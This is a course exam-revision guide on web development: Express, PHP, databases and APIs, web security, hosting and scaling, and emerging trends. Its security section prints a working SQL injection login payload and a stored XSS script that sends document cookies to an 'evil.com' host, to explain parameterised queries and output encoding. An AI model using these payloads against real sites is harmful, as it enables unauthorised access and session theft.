app.use(function (req, res, next) {          // middleware 1: logging
  console.log(req.method, req.url);
  next();                                    // pass control onward
});

function requireLogin(req, res, next) {      // middleware 2: authentication
  if (!req.session.user) return res.status(401).send("Please log in");
  next();
}

app.get("/dashboard", requireLogin, function (req, res) {
  res.send("Welcome to your dashboard");
});
```

The ordering point the deck makes is visible here: the logger runs first because it is declared first; `requireLogin` runs before the route handler because it is listed before it.

### Where people go wrong

- **Is React a library or a framework?** The deck calls it "a popular JavaScript **library** for building user interfaces" and then files it under the heading "**Frontend Frameworks**". The Week 8 Summary calls it a library in one bullet and a framework in another. **The course contradicts itself.** Safe answer: *"React is described as a JavaScript library for building user interfaces, though it is commonly grouped with frontend frameworks."* Defensible under either marking scheme.
- **Django and MVC.** The deck says Django follows **MVC**. Django's own documentation calls its pattern **MVT (Model-View-Template)**, and what Django calls a "view" is MVC's controller. **Answer MVC** — the course says MVC and names models, views and URL dispatchers.
- **Moment.js** has been in maintenance mode and discouraged for new projects since 2020; real teams use date-fns, Day.js or native `Intl`. The exam has none of that: Moment.js is "the go-to choice for date-related data". Same with **jQuery** — you would not reach for it in 2026; the exam wants its five features.
- The mid-lesson question asks about Express middleware **before Express has been introduced** in the deck. The material is out of order, not missing.
- The Rails "Active Record" slide is garbled in the source ("The softwaRails incorporates... database tables.are"). The intended sentence: *Rails incorporates the Active Record pattern, which provides an ORM layer for database interaction; models in Rails directly map to database tables.*

### In the exam

Very likely: "Distinguish between a library and a framework"; "State five key features of jQuery"; "Explain middleware in Express.js and give an example of when you would use it" — the mid-lesson question, so answer with the definition plus authentication. Likely: "Compare React, Angular and Vue.js" (the table); "State four backend frameworks and the language each uses."

Memorise: **DRY = Don't Repeat Yourself**; **CoC = Convention over Configuration**; **MVC = Model-View-Controller**; **ORM = Object-Relational Mapping**; **virtual DOM**; **unidirectional data flow**; **two-way data binding**; **dependency injection**; **incrementally adoptable**.

---

## Part 16 — PHP (Week 9)

*The Week 9 deck lost all its code to image extraction. It also has a gap of its own: the deck states PHP's control structures are "**Conditional Statements, Looping Structures and Branching Structures**", then covers conditionals and switch and **never covers loops at all** — while the summary slide lists "loops (for, while, foreach)" as examinable. PHP loops are taught below from outside knowledge and marked.*

### What it is, in the slides' terms

"**PHP**, which stands for **Hypertext Preprocessor**, is a widely-used **server-side scripting language** specifically designed for web development, known for its **flexibility, ease of use, and ability to create dynamic web applications**."

The Week 9 Summary supplies the week's actual framing: "when we embed PHP in HTML, we bring together the best of both worlds: the **structure and presentation capabilities of HTML** and the **dynamic processing power of PHP**." PHP runs **on the server**; the browser receives only the resulting HTML.

### Variables, data types and operators

"In PHP, we declare a variable using the **dollar sign (`$`)** followed by the variable name. Variable names are **case-sensitive** and must **start with a letter or underscore**, followed by letters, numbers, or underscores."

Seven data types — a list question waiting to happen: **String** (text), **Integer** (whole numbers), **Float/Double** (decimals), **Boolean** (true or false), **Array** (collections), **Object** (custom data types), **NULL** ("represents the absence of a value").

Six operator groups, members listed explicitly:

| Group | Members |
|---|---|
| **Arithmetic** | `+`, `-`, `*`, `/`, `%` **(modulus, returns the remainder)** |
| **Assignment** | `=`, `+=`, `-=`, `*=`, `/=` |
| **Comparison** | `==`, `!=`, `<`, `>`, `<=`, `>=` |
| **Logical** | `&&` AND, `\|\|` OR, `!` NOT |
| **Concatenation** | `.` — "used to concatenate (join) two strings together" |
| **Increment/Decrement** | `++`, `--` — increase or decrease by 1 |

**Comments**: **single-line** with `//`, **multi-line** between `/*` and `*/`; "not executed and ignored by the PHP interpreter".

Note what is absent: unlike the JavaScript list in Part 11, PHP's comparison list has **no `===`**. PHP does have it; the deck omits it. If asked to list PHP's comparison operators, give the six the deck gives.

### Control structures

Three types named: **conditional statements**, **looping structures**, **branching structures**.

Three conditionals: **`if`** ("execute a block only if a condition is true; if false, the block is skipped"); **`if-else`** ("if the `if` condition is false, the code under `else` is executed"); **`elseif`** ("test multiple conditions in sequence... PHP will evaluate the elseif conditions until it finds one that is true"). The deck's worked examples are `$age < 18` → "You are a minor"; `$temperature > 30` → "It's hot outside" / "It's not too hot outside"; and a `$score` grading ladder.

**Ternary operator** `? :` — "a concise way to write conditional statements... often used for simple if-else scenarios", e.g. `$can_vote = ($age >= 18) ? "Yes" : "No";`

**Switch statement** — "especially useful when you want to compare a **single value** to **multiple possible values**. The **`break`** keyword is used to exit the switch statement after a match is found."

**Loops — not from the course deck.** *No slide covers these, but the summary lists them.* PHP has **`for`**, **`while`**, **`do-while`** and **`foreach`**. `foreach` is the one that distinguishes PHP from the JavaScript loops in Part 11:

```php
<?php
foreach ($colors as $color) { echo $color; }

// associative form, giving key and value
foreach ($person as $key => $value) { echo "$key: $value"; }
?>
```

If asked for PHP's loops by name, answer **for, while, do-while, foreach**.

### Functions

"A function is a **self-contained block of code that performs a specific task**... designed to be **reusable**... Functions help improve **code readability, reduce errors**, and make code easier to maintain."

Declaration: "the **`function`** keyword followed by the function name, a pair of parentheses, and a code block enclosed in **curly braces `{}`**." Three named parts: **functionName** (descriptive of the task), **parameters** ("optional values passed into the function... placeholders for data the function needs"), **result** ("an optional return statement... Not all functions need to return a value").

The word distinction is examinable: "when we **define** a function, we specify its **parameters**. When we **call** the function, we provide the actual values, called **arguments**."

**Default values**: "we can assign default values to parameters, making them **optional** when calling the function" — the deck's example is `function greet($name = "Guest")`.

**Built-in functions**: "PHP provides a **vast library** of built-in functions... string manipulation, array operations, date and time handling, database interaction, and more."

**Variable scope** — three types, and this list differs from JavaScript's: **local** (defined within a function, accessible only there), **global** (defined outside any function, accessible anywhere in the script), **static** ("used to **retain their values across function calls**"). **Static** is the discriminator — JavaScript has no equivalent in this course.

**Recursive functions** — "a function that calls itself... useful for solving problems that can be broken down into **smaller, similar subproblems**". The deck's example is factorial, with "**the base case (`$n <= 1`) defines when the recursion should stop**":

```php
<?php
function factorial($n) {
    if ($n <= 1) { return 1; }        // base case stops the recursion
    return $n * factorial($n - 1);
}
echo factorial(5);                     // 120
?>
```

### Concrete example — embedding PHP in HTML

*Reconstruction of "Building a Simple Web Page", which the deck says "displays a personalised greeting":*

```php
<!DOCTYPE html>
<html>
  <body>
    <?php $name = "Ade"; $today = date("l, j F Y"); ?>
    <h1>Hello, <?php echo $name; ?>!</h1>
    <p>Today is <?php echo $today; ?>.</p>

    <?php if ($name === "Ade") { ?>
      <p>You have 3 new messages.</p>
    <?php } else { ?>
      <p>Welcome, guest.</p>
    <?php } ?>
  </body>
</html>
```

The browser never sees any PHP. It receives only `<h1>Hello, Ade!</h1><p>Today is Monday, 12 May 2025.</p><p>You have 3 new messages.</p>`. That the PHP executes on the server and the client receives plain HTML **is** the Week 9 topic.

**Separation of concerns** is named in the Week 9 Summary as the key best practice, with **three layers** whose names are examinable: **presentation layer**, **business logic layer**, **data (access) layer**. Four named scenarios where dynamic content generation is crucial: **user authentication**, **form processing**, **database interaction**, **conditional display**.

### Where people go wrong

- **Forgetting the `$`.** PHP variables always carry it, including inside strings; JavaScript's do not.
- **`.` for concatenation, not `+`.** PHP joins strings with a dot. This is one of the likeliest one-mark discriminators between the PHP and JavaScript questions.
- **`elseif` is one word** in PHP.
- **Static variables** are unique to PHP's scope list here. Do not answer "global, local, block" — that is the JavaScript answer.
- Omitting the base case in a recursion answer. The deck states it explicitly.
- In real work you would never interleave `<?php ?>` with HTML as above — you would use a template engine, exactly as the deck's own separation-of-concerns advice implies. But the week's topic is literally "Embedding PHP Code in HTML", so show the interleaved form, then mention separation of concerns as the best practice.

### In the exam

Near-certain, the mid-lesson pair: "How do you create a basic PHP function and what is its purpose?" and "Write a PHP snippet that calculates the sum of `$num1` and `$num2`, stores it in `$sum`, and echoes it" (`$sum = $num1 + $num2; echo $sum;`). Likely: "List the data types supported by PHP" (seven); "Explain the three types of variable scope in PHP"; "What is a recursive function? Illustrate with factorial"; "State the advantages of embedding PHP in HTML."

Memorise: **PHP = Hypertext Preprocessor**; the seven data types; the six operator groups; `$`, `.`, `//`, `/* */`; **local, global, static**; **presentation / business logic / data layers**.

---

## Part 17 — Backend programming, server environments, databases and APIs (Week 10)

### Server-side programming languages

"A **server-side programming language**, often referred to as a **backend language**, is a programming language specifically designed for server-side scripting. It enables developers to write code that **runs on a web server and processes requests from client-side applications**."

Five named reasons they are essential: **dynamic content generation**, **data processing**, **user authentication**, **security** ("protecting against common web vulnerabilities like SQL injection and cross-site scripting"), **scalability**.

Five named languages:

| Language | The deck's note | Frameworks named |
|---|---|---|
| **Python** | Versatile, used well beyond web development | Django, Flask |
| **Ruby** | "Renowned for its **elegant syntax**" | Ruby on Rails |
| **PHP** | "One of the **most widely used**... often **embedded in HTML**" | — |
| **Node.js** | "JavaScript on the server side... **highly efficient for building real-time applications**" | — |
| **Java** | "Renowned for its **reliability and scalability**" | Spring |

The mid-lesson answer names **Node.js** for real-time stock prices, "due to its **event-driven, non-blocking I/O model**" and its ability to "handle a large number of concurrent connections". Memorise that phrase; it is the deck's own answer.

### Server environments

"A **server environment**, also known as a **server infrastructure** or **server stack**, refers to the collection of **hardware, software, and networking components** that enable a server to perform its functions."

Five named reasons proper setup matters: **performance**, **security**, **reliability**, **scalability**, **maintenance**.

Seven named **components** — a list question: **server hardware** (physical server or VM); **storage** (hard drives or SSDs); **networking equipment** (NICs, switches, routers); **operating system** (Linux distributions such as Ubuntu or CentOS, or Windows Server); **server software** (web servers Apache/Nginx, DBMSs MySQL/PostgreSQL, application servers Tomcat/Node.js); **networking configuration** (IP addresses, DNS, firewall rules); **security measures** (firewalls, intrusion detection systems, encryption, access control). Plus **monitoring and management tools** — Nagios, Prometheus, Ansible, Puppet.

### The four worked server-environment examples

Each is a fixed six-row template with named products. **LAMP** in particular is a classic acronym question.

| | Web server env. | Application server env. | Database server env. | Cloud env. |
|---|---|---|---|---|
| Stack | **LAMP: Linux, Apache, MySQL, PHP** | Docker + Kubernetes | PostgreSQL | AWS |
| Hardware | Dedicated server or VM | Cloud VMs / container hosts | High-performance server, ample storage | AWS **EC2 (Elastic Compute Cloud)** |
| OS | Ubuntu Server | CoreOS or a Linux distro | CentOS or Ubuntu Server | Amazon Linux or custom **AMI** |
| Software | Apache, MySQL, PHP | Docker, Kubernetes | PostgreSQL | AWS RDS, AWS Lambda |
| Networking | Public IP, DNS records, firewall rules | Load balancers, container networking, DNS | Private network, restrictive firewall rules | **VPC (Virtual Private Cloud)**, security groups, route tables |
| Security | Firewall rules for HTTP/HTTPS, updates, patches | Container scanning, **RBAC**, network policies | Strong authentication, encryption at rest, backups | **IAM**, AWS **WAF** |
| Monitoring | phpMyAdmin, Fail2ban | Prometheus, Grafana, Helm | pgAdmin, pgBadger | CloudWatch, Elastic Beanstalk |

### Database management

"**Database management** is the process of efficiently and securely **storing, organising, retrieving, and managing data** within databases", covering "data modelling, database design, implementation, optimisation, and ongoing maintenance". Five named reasons it matters: **data integrity**, **data accessibility**, **data security**, **scalability**, **data recovery**.

**Key terms** — eight, all examinable as definitions:

| Term | Definition from the deck |
|---|---|
| **Database** | A structured collection of data organised for efficient storage, retrieval and manipulation |
| **DBMS** | Software providing an interface for interacting with databases; manages storage, retrieval, manipulation, user access, security |
| **Data model** | A conceptual representation of data structure and relationships — relational, document, graph |
| **SQL** | A domain-specific language for querying and managing relational databases |
| **Schema** | A blueprint defining how data is organised — tables, fields, data types, relationships |
| **Normalisation** | Organising data to **minimise redundancy and improve data integrity** |
| **Indexing** | Creating indexes that allow **faster data retrieval** |
| **ACID** | **Atomicity, Consistency, Isolation, Durability** — properties guaranteeing reliable transaction processing |

**ACID must be memorised letter by letter.** It is exactly the acronym this paper asks you to expand.

**The five named DBMSs:**

| DBMS | Type | Usage | Features |
|---|---|---|---|
| **MySQL** | RDBMS | Web applications; small to medium databases | ACID-compliant, open-source, supports SQL, strong community |
| **PostgreSQL** | RDBMS | Large-scale applications, complex data models | ACID-compliant, open-source, advanced data types, strong JSON support |
| **Oracle Database** | RDBMS | Enterprise applications, data warehouses | ACID-compliant, high availability and scalability, advanced analytics |
| **MongoDB** | **NoSQL** | Large volumes of unstructured / semi-structured data | **Schema-less**, document-oriented, flexible data models |
| **Redis** | **In-memory NoSQL** | **Caching**, real-time analytics, message brokering | Extremely fast, **key-value store**, supports sets, lists, hashes |

**Database management techniques** — seven named: **data modelling** (including **ERDs — entity-relationship diagrams**, primary keys, foreign keys, indexes), **normalisation**, **indexing**, **security**, **performance optimisation**, **replication and high availability**, **scaling** (horizontal = more servers; vertical = upgrading resources). *(The deck repeats the last four on a second slide — that is duplication in the source, not a second list.)*

### APIs

"An **Application Programming Interface (API)** is a **set of rules, protocols, and tools** that allows different software applications to **communicate with each other**. APIs define the **methods and data formats** that developers can use to request and exchange information."

Five named reasons APIs matter: **interoperability**, **modularity**, **scalability**, **ecosystem expansion**, **front-end and back-end separation**.

**Key terms** — seven: **endpoint** ("a specific **URL or URI (Uniform Resource Identifier)** that represents a resource or service"); **HTTP methods** (GET retrieve, POST create, PUT update, DELETE remove); **request**; **response** ("includes **status information, data, and headers**"); **authentication** ("verifying the identity of a client... API keys, tokens"); **rate limiting** ("restricts the number of requests within a specified time frame to prevent abuse and ensure fair usage"); **API documentation**.

**API development** — a seven-step ordered process: **define the purpose**; **design the API** (endpoints, methods, data formats **often in JSON or XML**, error handling, consistent naming); **implement the API**; **testing** (success and error cases); **documentation** (sample requests and responses); **security** (authentication and authorisation); **versioning** (for backward compatibility).

**API integration** — five named scenarios with named providers: **social media** (Facebook, Twitter, Instagram); **payment gateways** (PayPal, Stripe, Square); **mapping and location services** (Google Maps); **cloud storage** (Amazon S3, Google Drive); **third-party data access** (weather, stock market, news feeds).

**Integration best practices** — seven: **read documentation**, **handle errors**, **respect rate limiting**, **validate data**, **authenticate properly**, **test thoroughly**, **monitor for version updates**.

### Concrete example — the full round trip

*Reconstruction, following the Week 10 Summary's own diagram (Frontend → HTTP → Backend → Business Logic → API → Database):*

```
Browser (HTML/CSS/JS)
  |  1. GET /api/students/123/courses   +   Authorization: Bearer <token>
  v
Web server (Nginx) -> Application server (Node.js / PHP / Django)
  |  2. Middleware authenticates the token
  |  3. Route handler runs the business logic
  |  4. Data layer issues SQL: SELECT ... WHERE student_id = 123
  v
Database server (MySQL / PostgreSQL)
  |  5. Rows returned; application serialises to JSON
  v
  |  6. HTTP/1.1 200 OK  /  Content-Type: application/json
  |     [{"code":"CSC_106","title":"Introduction to Web Technologies"}]
  v
Browser: 7. JavaScript parses the JSON and updates the DOM
          — no full page reload (AJAX, Part 12)
```

Everything above the network line is Weeks 3–8; everything below is Weeks 9–11; the line itself is Week 2. That diagram is the course.

The Week 10 Summary adds one more named mechanism: "**cookies or session management technologies** are used to maintain user sessions and manage state across requests" — the answer to HTTP's statelessness from Part 3.

### Where people go wrong

- **ACID.** Losing a mark for "Availability" instead of "Atomicity", or dropping Isolation. Say it aloud: **Atomicity, Consistency, Isolation, Durability.**
- Calling MongoDB relational. It is **NoSQL, schema-less, document-oriented**. Redis is **in-memory, key-value**.
- **Horizontal vs vertical scaling.** Horizontal = **more machines**; vertical = **a bigger machine**. Students reverse them constantly.
- **Endpoint** means the URL, not the server.
- **LAMP** — know all four letters: **Linux, Apache, MySQL, PHP**.
- Professionally you would say "a REST API returns JSON". The exam's phrase is "often in **JSON or XML**". Include XML; it is half the mark.

### In the exam

Very likely: "Expand ACID and explain each property"; "Name five common DBMSs and state the type and typical use of each"; "What is an API? State five reasons APIs are important." Likely: "Describe the components of a server environment"; "Outline the steps in API development"; "Differentiate between horizontal and vertical scaling"; and the mid-lesson pair — **Node.js** for real-time stock prices, **MySQL** for a small e-commerce site (reliable, ACID-compliant, SQL support, strong community, easy to use).

Memorise: **API = Application Programming Interface**; **URI = Uniform Resource Identifier**; **DBMS = Database Management System**; **RDBMS = Relational DBMS**; **SQL = Structured Query Language**; **ACID = Atomicity, Consistency, Isolation, Durability**; **LAMP = Linux, Apache, MySQL, PHP**; **ERD = Entity-Relationship Diagram**; **IAM, VPC, EC2, AMI, RBAC, WAF**.
---

## Part 18 — Web application security (Week 11)

### What it is, in the slides' terms

"**Web application security** is the practice of protecting web applications from threats that can compromise the **confidentiality, integrity, or availability** of data." Threats "come from various sources, including malicious users, attackers, and vulnerabilities within the application itself."

Three terms are defined separately and are examinable as definitions:

- **Web application** — "a software program that operates on a web server and interacts with users through a web browser". Examples: online banking portals, e-commerce websites, social media platforms.
- **Vulnerability** — "a **weakness** in a web application's design, implementation, or configuration that can be exploited by attackers".
- **Threat** — "a **potential danger or harm** to a web application's security". Examples: SQL injection, XSS, DDoS.

The vulnerability/threat distinction matters: a **vulnerability is a weakness you have**; a **threat is a danger that could exploit it**.

### The five named vulnerabilities

Learn all five with the deck's own examples — this is the single most examinable list in Week 11.

| Vulnerability | Definition | The deck's example |
|---|---|---|
| **SQL Injection (SQLi)** | An attacker inserts malicious SQL into user inputs, manipulating the application's database | Entering `' OR 1=1--` in a login form may grant unauthorised access |
| **Cross-Site Scripting (XSS)** | Attackers inject malicious scripts into pages viewed by other users; leads to data theft or session hijacking | Embedding malicious JavaScript in a comment section |
| **Cross-Site Request Forgery (CSRF)** | Tricks authenticated users into performing unwanted actions without their consent | A malicious link that changes a user's email address on their profile |
| **Injection attacks** | Besides SQLi — **command injection**, **XML injection** — exploiting applications that process user data without proper validation | — |
| **Security misconfigurations** | Developers overlook security settings and leave sensitive information exposed | Leaving database credentials in plaintext configuration files |

The Week 11 Summary adds two more to the threat list: **brute force attacks** and **phishing**.

### Best practices — seven, in slide order

1. **Input validation** — "always validate and sanitise user inputs to prevent injection attacks. Use **parameterised queries** for database interactions to prevent SQL injection."
2. **Output encoding** — "encode output to prevent XSS attacks. Tools like **Content Security Policy (CSP)** can help mitigate XSS risks."
3. **Authentication and authorisation** — strong authentication, privileges limited by roles and permissions; "**two-factor authentication (2FA)** adds an extra layer of security". The Summary also names **multi-factor authentication (MFA)** and **strong password policies**.
4. **Session management** — "securely manage user sessions and use **unique tokens** to prevent CSRF attacks. Consider implementing **session expiration** policies."
5. **Security headers** — "**HTTP Strict Transport Security (HSTS)** and **X-Content-Type-Options**".
6. **Regular updates** — keep libraries and frameworks up to date to patch known vulnerabilities.
7. **Security testing** — **vulnerability scanning**, **penetration testing**, **code reviews**.

**Web Application Firewall (WAF)** — "a security appliance or service that **filters and monitors HTTP/HTTPS requests** to a web application. It acts as a **shield** against common web application attacks, providing an **additional layer of security**." The mid-lesson answer adds the mechanism: "it inspects incoming traffic, identifies malicious patterns or payloads, and blocks or mitigates potential threats before they reach the web application."

**Secure development practices** — three named: **secure coding** ("avoiding hard-coded credentials and following security guidelines"); **code review** ("catch security issues early"); **DevSecOps** ("incorporating security into the DevOps pipeline ensures security is an integral part of the development process, **not an afterthought**").

### Concrete example — how the injection works

*Reconstruction. The deck names the payload `' OR 1=1--` but never shows the query it breaks. Seeing it is the fastest way to explain parameterised queries in an answer:*

```php
// VULNERABLE — user input concatenated straight into SQL
$sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";

// With $user = "admin' OR 1=1--" the database receives:
//   SELECT * FROM users WHERE username = 'admin' OR 1=1--' AND password = ''
// 1=1 is always true and -- comments out the rest, so the password
// check never runs and the first row is returned.

// SAFE — parameterised query: the input can never become SQL syntax
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$user, $pass]);
```

The XSS parallel, which connects back to Part 14's warning about `innerHTML`: a comment stored as `<script>fetch('//evil.com?c='+document.cookie)</script>` and rendered without **output encoding** runs in every other reader's browser and steals their session — that is the "session hijacking" the deck mentions.

### Where people go wrong

- **Confusing XSS and CSRF.** **XSS injects a script into your site** so it runs in a victim's browser. **CSRF makes a victim's browser send a legitimate-looking request** to your site using credentials it already has. XSS = untrusted code on your page; CSRF = trusted browser, untrusted intent.
- Naming a *tool* when asked for a *practice*. "Use a WAF" is not input validation.
- Pairing the wrong defence with the wrong attack. Fixed pairs the deck expects: SQLi → **input validation / parameterised queries**; XSS → **output encoding / CSP**; CSRF → **session management / unique tokens**.
- Saying HTTPS prevents SQL injection. It does not; it protects data in transit only.
- Professionally you would name OWASP and its Top 10. **OWASP appears nowhere in this course.** Do not build an answer around it; use the deck's five vulnerabilities.

### In the exam

Very likely: "State and explain five common web application vulnerabilities, with an example of each"; "What is a Web Application Firewall and how does it protect web applications?" — the mid-lesson question, so give the filtering/monitoring definition plus the inspect-identify-block mechanism. Likely: "List five best practices for web application security"; "Differentiate between a vulnerability and a threat."

Memorise: **SQLi**, **XSS = Cross-Site Scripting**, **CSRF = Cross-Site Request Forgery**, **DDoS**, **WAF = Web Application Firewall**, **CSP = Content Security Policy**, **HSTS = HTTP Strict Transport Security**, **2FA / MFA**, **DevSecOps**; the payload `' OR 1=1--`.

---

## Part 19 — Deployment, scaling, performance and monitoring (Week 11)

### Deployment and hosting terminology

Six terms defined:

- **Server** — "a computer or software system that responds to requests from client devices". Examples: web servers, file servers, database servers.
- **Deployment** — "the process of **setting up and configuring servers** to make them operational and accessible to users. It involves hardware setup, software installation, and network configuration."
- **Hosting** — "providing server **resources and infrastructure** to make applications or websites accessible on the internet. Hosting can be done on-premises or through third-party providers."
- **Physical servers** — "tangible hardware machines dedicated to running server applications", e.g. on-premises servers in data centres.
- **Virtual servers** — "software-based instances that run on physical hardware. **Virtualisation** allows multiple virtual servers to coexist on a single physical machine."
- **Server roles** — "the specific functions a server performs": web servers (Apache, Nginx), database servers (MySQL, PostgreSQL), mail servers (Microsoft Exchange).

### The four hosting options — a guaranteed comparison question

| Option | Definition from the deck | Trade-off | Named example |
|---|---|---|---|
| **On-premises** | Servers within an organisation's own facilities — data centres or server rooms | "Complete control but requires substantial infrastructure and maintenance" | — |
| **Cloud hosting** | Infrastructure from providers such as **AWS, Microsoft Azure, Google Cloud Platform (GCP)** | "Scalability, flexibility, and cost-efficiency" | AWS Elastic Beanstalk |
| **VPS (Virtual Private Server)** | Partitions a physical server into multiple virtual servers, each with its own OS, resources and configuration | "A balance between control and cost" | DigitalOcean running WordPress |
| **Shared hosting** | Multiple websites on a single server, sharing CPU and RAM | "Cost-effective but may have limitations in performance and customisation" | Bluehost for a personal blog |

Three practical scenarios the deck walks through: deploying a **WordPress website** (choice depends on budget, traffic expectations, technical expertise); setting up a **mail server** (on-premises or VPS, with Microsoft Exchange or Postfix); **scaling an e-commerce website** for holiday traffic (cloud hosting, scale up and down without buying hardware).

**Security and maintenance** — three named areas: **security measures** (firewalls, regular patching, intrusion detection systems, strong authentication); **monitoring and maintenance** (monitor performance, apply updates, perform backups); **disaster recovery** ("a robust plan to mitigate data loss and downtime").

### Scalability and performance optimisation

**Scalability** is "the ability of a system to **handle increased load while maintaining or improving performance**... to accommodate a growing number of users, requests, or data **without a proportional decrease in performance**."

**Performance optimisation** is "improving the **speed, responsiveness, and overall efficiency** of a web application. It aims to **reduce latency**, enhance user experience, and minimise resource utilisation."

**Horizontal scaling** — "adding **more machines or instances** to distribute the workload... often achieved by **load balancing**", e.g. adding more web server nodes. **Vertical scaling** — "also known as **scaling up**, involves **upgrading the existing server or hardware**", e.g. more CPU cores, memory or storage.

Five named optimisation techniques:

1. **Load balancing** — "evenly distributes incoming traffic across multiple server instances... ensures that **no single server becomes a bottleneck**, improving both scalability and **fault tolerance**." Named tools: **NGINX**, **AWS Elastic Load Balancing**.
2. **Caching** — "storing frequently accessed data or computed results in a temporary storage layer (cache)... reduces the need to fetch data from the primary data source." Example: browser caching for static assets.
3. **Content Delivery Networks (CDNs)** — "networks of **geographically distributed servers** that cache and deliver web content from locations **closer to users**. This reduces latency." Named example: **Cloudflare**.
4. **Database optimisation** — optimising queries, indexing and data structures. Example: indexing frequently queried columns to speed up SELECT operations.
5. **Front-end optimisation** — "minimising the size and number of HTTP requests, optimising images, and implementing **lazy loading**". Example: minifying CSS and JavaScript, and responsive images.

**Monitoring and testing** — **performance monitoring** using "response time, error rates, and resource utilisation", with named tools **New Relic** and **Datadog**; **load testing** to "simulate high levels of traffic and identify performance bottlenecks", with named tools **Apache JMeter** and **Gatling**.

### Monitoring and debugging

**Monitoring** is "the practice of **continuously observing** a web application's performance, health, and behaviour **in real time**... collecting data, metrics, and logs to identify anomalies and trends." **Debugging** is "the process of **identifying and resolving issues, errors, or defects** in a web application's code or functionality."

**Key concepts of monitoring** — three, each with a definition and an example:

- **Metrics** — "quantifiable measurements... response times, error rates, resource utilisation". Example: monitoring an e-commerce site's average response time.
- **Alerts** — "notifications triggered when **predefined conditions or thresholds** are met or exceeded". Example: an alert when server CPU exceeds 90% for five consecutive minutes.
- **Logging** — "recording events, actions, and errors... a detailed history of what happened". Example: log entries for login attempts with timestamps and success/failure status.

**Key concepts of debugging** — three: **error handling** ("anticipating and managing errors... prevents crashes and provides meaningful error messages"; example: `try-catch` blocks in JavaScript); **debugging tools** (IDEs, code editors, browser developer tools; example: Chrome DevTools); **version control** (Git, "roll back to previous versions and collaborate with others").

**Testing and continuous integration** — **testing** covers "**unit testing, integration testing, and end-to-end testing**", the three named levels. **Continuous Integration (CI)** is "practices that involve **automatically building, testing, and deploying code changes as they are committed to a version control system**. CI pipelines can include automated tests that catch and report issues early." Named tools: **Jenkins**, **Travis CI**.

### Concrete example

*Reconstruction of the deck's "scaling an e-commerce website" scenario, showing where each named technique sits:*

```
                        Users worldwide
                              |
                    [ CDN — Cloudflare ]        <- caches static assets
                              |                     near the user
                    [ Load balancer — NGINX ]   <- horizontal scaling:
                       /      |      \              spreads traffic,
                      /       |       \             removes the bottleneck
              [web 1]     [web 2]     [web 3]   <- add nodes for more load
                      \       |       /
                       \      |      /
                    [ Cache — Redis ]           <- avoids repeat DB reads
                              |
                    [ Database — indexed ]      <- vertical scaling:
                                                    a bigger machine
```

### Where people go wrong

- **Horizontal vs vertical again.** Horizontal = more boxes, achieved by load balancing. Vertical = a bigger box, achieved by upgrading CPU/RAM/storage. If the answer mentions a load balancer, it is horizontal.
- Confusing **caching** with a **CDN**. Caching is the technique; a CDN is caching *distributed geographically to reduce latency*. The distance-to-user point is what earns the CDN mark.
- Confusing **VPS** with **cloud hosting**. A VPS partitions one physical server; cloud hosting draws on a provider's whole infrastructure and scales elastically.
- Answering a monitoring question with debugging content. **Monitoring is continuous and pre-emptive; debugging is reactive and after the fact.**
- In real work "CI/CD" is one phrase. The course names only **CI** and defines it as build, test and deploy on commit. Do not introduce CD as a separate named concept.

### In the exam

Very likely, the mid-lesson question: "You are deploying a web application for a growing e-commerce business. What hosting option would you recommend and why?" — the deck's own answer is **cloud hosting, such as AWS**, for **scalability, flexibility and cost-efficiency**, allowing resources to be adjusted to traffic demands, with managed services reducing operational burden. Also likely: "Differentiate between horizontal and vertical scaling"; "Explain load balancing, caching and CDNs"; "State three key concepts of monitoring and three of debugging."

Memorise: **VPS = Virtual Private Server**; **CDN = Content Delivery Network**; **CI = Continuous Integration**; **AWS, Azure, GCP**; **NGINX, Cloudflare, New Relic, Datadog, JMeter, Gatling, Jenkins, Travis CI**; unit / integration / end-to-end testing.

---

## Part 20 — Future trends: WebAssembly, serverless, AI and PWAs (Week 12)

### WebAssembly

"**WebAssembly**, often abbreviated as **Wasm**, is a **binary instruction format designed for web browsers**. It allows **high-performance execution of code** on web pages." The motivation the deck gives: "traditional web technologies like JavaScript have limitations in terms of performance." Wasm "is **compiled from other languages, like C++, Rust, or TypeScript**, into a binary format that can be executed **directly by the browser**".

Three named advantages: **speed and performance** ("**near-native performance**", suitable for gaming, simulations, video editing); **cross-platform compatibility** ("supported by all major browsers"); **security** ("runs in a **sandboxed environment**").

Five named use cases: **gaming** (the deck's example: "Cut the Rope" ported to WebAssembly); **video and image processing**; **augmented and virtual reality**; **scientific simulations**; **serverless computing**.

### Serverless architecture

"**Serverless architecture** is a cloud computing paradigm where **the cloud provider manages the infrastructure**, allowing developers to focus solely on writing code."

Three key concepts: **Functions as a Service (FaaS)** — "the core of serverless architecture, where code is executed **in response to events**"; **event-driven** — "responding to events such as HTTP requests, database changes, or file uploads"; **stateless** — "serverless functions **do not maintain server-specific state between invocations**".

Four named benefits: **scalability** (automatic scaling with incoming traffic); **cost-efficiency** ("pay only for the actual compute resources used during function execution"); **faster development**; **automatic scaling**.

Five named use cases: **web applications**; **APIs and microservices**; **real-time data processing**; **IoT and edge computing**; **background jobs**.

The mid-lesson answer names the two challenges, which is where the marks hide: "**cold starts** and **vendor lock-in** are challenges serverless applications face, but the benefits outweigh them. Traditional servers provide control but demand manual scaling and higher costs."

### Machine learning and AI on the web

Definitions: **Machine Learning** is "a subset of AI that focuses on **training computer systems to learn from data** and make predictions or decisions". **Artificial Intelligence** is "the broader concept of creating machines or software that can perform tasks that typically require human intelligence".

Five named ML types, each with an example:

| Type | Definition | Deck's example |
|---|---|---|
| **Supervised learning** | Trained on **labelled** data to make predictions or classifications | A spam filter classifying emails |
| **Unsupervised learning** | Trained on **unlabelled** data to discover patterns or groupings | Clustering customer data into market segments |
| **Deep learning** | A subset of ML using **neural networks with many layers** | Image recognition |
| **NLP (Natural Language Processing)** | Enabling computers to understand, interpret and generate human language | A chatbot understanding user queries |
| **Computer vision** | Teaching computers to interpret visual information from images or video | Facial recognition in a security system |

Five named applications: **personalisation** (Netflix recommendations); **search engines** (Google's RankBrain); **chatbots and virtual assistants** (Amazon's Alexa); **content generation** (GPT-3); **fraud detection** (banks identifying unusual spending patterns).

Five named frameworks and tools: **TensorFlow** (Google, open-source); **PyTorch** ("flexibility and dynamic computation"); **Scikit-Learn** (Python); **Microsoft Azure ML**; **Google Cloud AI Platform**.

Five named challenges: **data privacy and ethics**; **bias and fairness**; **scalability**; **interoperability**; **cybersecurity**.

